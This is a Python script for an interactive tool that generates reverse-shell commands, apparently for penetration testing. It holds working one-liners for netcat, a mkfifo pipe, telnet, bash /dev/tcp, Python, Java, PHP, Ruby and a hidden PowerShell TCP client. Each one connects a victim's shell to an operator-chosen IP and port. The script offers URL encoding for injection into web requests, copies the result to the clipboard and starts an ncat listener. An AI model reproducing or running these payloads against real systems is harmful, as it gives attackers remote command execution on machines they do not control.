#!/usr/bin/env python3
# coding=utf-8
import ipaddress
import os
import socket
import urllib.parse
from string import Template
from typing import List

import readchar
from colorama import Fore, Style
from pyperclip import copy

success = Style.BRIGHT + '[ ' + Fore.GREEN + '+' + Fore.RESET + ' ] ' + Style.RESET_ALL
information = Style.BRIGHT + '[ ' + Fore.YELLOW + '!' + Fore.RESET + ' ] ' + Style.RESET_ALL
failure = Style.BRIGHT + '[ ' + Fore.RED + '-' + Fore.RESET + ' ] ' + Style.RESET_ALL

# defaults
ip = socket.gethostbyname(socket.gethostname())
port = 443
shell = '/bin/sh'
command_key = 'nc plain'

default_template = Template(
    Style.BRIGHT + '[ default ' + Fore.GREEN + '$param' + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
header_template = Template(Style.BRIGHT + '===== [ ' + Fore.CYAN + '$param' + Fore.RESET + ' ] =====' + Style.RESET_ALL)

shells = {
    'sh': '/bin/sh',
    'bash': '/bin/bash',
    'zsh': '/bin/zsh',
    'ksh': '/bin/ksh',
    'tcsh': '/bin/tcsh',
    'dash': '/bin/dash'
}

commands = {
    'nc plain': Template('nc -e $shell $ip $port'),
    'nc mkfifo': Template('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $ip $port >/tmp/f'),
    'telnet': Template('rm -f /tmp/p; mknod /tmp/p p && telnet $ip $port 0/tmp/p'),
    'bash': Template('bash -i >& /dev/tcp/$ip/$port 0>&1'),
    'python': Template('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                       's.connect(("$ip",$port));'
                       'os.dup2(s.fileno(),0);'
                       'os.dup2(s.fileno(),1);'
                       'os.dup2(s.fileno(),2);'
                       'p=subprocess.call(["$shell","-i"]);\''),
    'java': Template('r = Runtime.getRuntime()'
                     'p = r.exec(["$shell","-c","exec 5<>/dev/tcp/$ip/$port;'
                     'cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
                     'p.waitFor()'),
    'php': Template('php -r \'$sock=fsockopen("$ip",$port);exec("$shell -i <&3 >&3 2>&3");\''),
    'ruby': Template('ruby -rsocket -e \'f=TCPSocket.open("$ip",$port).to_i;'
                     'exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)\''),
    'powershell': Template('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object '
                           'System.Net.Sockets.TCPClient("$ip",$port);'
                           '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
                           'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
                           '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                           '$sendback = (iex $data 2>&1 | Out-String );'
                           '$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
                           '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
                           '$stream.Write($sendbyte,0,$sendbyte.Length);'
                           '$stream.Flush()};$client.Close()')
}


def is_valid(param_ip):
    try:
        ipaddress.ip_address(param_ip)
        return True
    except ValueError:
        return False


def exit_program():
    print('\n' + success + 'Bye friend, hope to see you soon!')
    exit(0)


def select(
        options: List[str],
        selected_index: int = 0) -> int:
    print('\n' * (len(options) - 1))
    while True:
        print(f'\033[{len(options) + 1}A')
        for i, option in enumerate(options):
            print('\033[K{}{}'.format(
                '\033[1m[\033[32;1m x \033[0;1m]\033[0m ' if i == selected_index else
                '\033[1m[   ]\033[0m ', option))
        keypress = readchar.readkey()
        if keypress == readchar.key.UP:
            new_index = selected_index
            while new_index > 0:
                new_index -= 1
                selected_index = new_index
                break
        elif keypress == readchar.key.DOWN:
            new_index = selected_index
            while new_index < len(options) - 1:
                new_index += 1
                selected_index = new_index
                break
        elif keypress == readchar.key.ENTER:
            break
        elif keypress == readchar.key.CTRL_C:
            raise KeyboardInterrupt
    return selected_index


def specify_ip():
    print(header_template.safe_substitute(param='SPECIFY IP'))
    while True:
        global ip
        input_ip = input(default_template.safe_substitute(param=ip))
        if input_ip.__eq__(''):
            break
        elif is_valid(input_ip):
            ip = input_ip
            print(information + 'IP changed to -> ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
            break
        else:
            print(failure + 'Please, specify a valid IP address!')


def specify_port():
    print(header_template.safe_substitute(param='SPECIFY PORT'))
    while True:
        try:
            global port
            input_port = input(default_template.safe_substitute(param=port))
            if input_port.__eq__(''):
                break
            elif int(input_port) in range(1, 65535):
                port = int(input_port)
                print(information + 'Port changed to -> ' + Style.BRIGHT + Fore.YELLOW + str(port) + Style.RESET_ALL)
                break
            else:
                raise ValueError
        except ValueError:
            print(failure + 'Choose a valid port number!')


def select_command():
    print(header_template.safe_substitute(param='SELECT COMMAND'))
    selected_command = select(list(commands.keys()))
    global command_key
    command_key = list(commands.keys()).__getitem__(selected_command)


def select_shell():
    if command_key != 'powershell':
        print(header_template.safe_substitute(param='SELECT SHELL'))
        selected_shell = select(list(shells.keys()))
        global shell
        shell = list(shells.values()).__getitem__(selected_shell)


def build_command():
    command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
    encode_command = input('URL encode the command? [y/N] -> ')
    if encode_command.lower() == 'y':
        command = urllib.parse.quote_plus(command)
        print(information + 'Command is now URL encoded!')

    print(success + 'The finished command is: \n\n' + command + '\n')

    if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
        copy(command)
        print(success + 'Reverse shell command copied to clipboard!')


def setup_listener():
    listener = input('Do you want to setup a listener? [Y/n] : ')
    if listener.__eq__('') or listener.lower() == 'y':
        print(success + 'Waiting for connections...')
        os.system('ncat -lp ' + str(port))
    else:
        exit_program()


if __name__ == '__main__':
    try:
        specify_ip()
        specify_port()
        select_command()
        select_shell()
        build_command()
        setup_listener()
    except KeyboardInterrupt:
        exit_program()
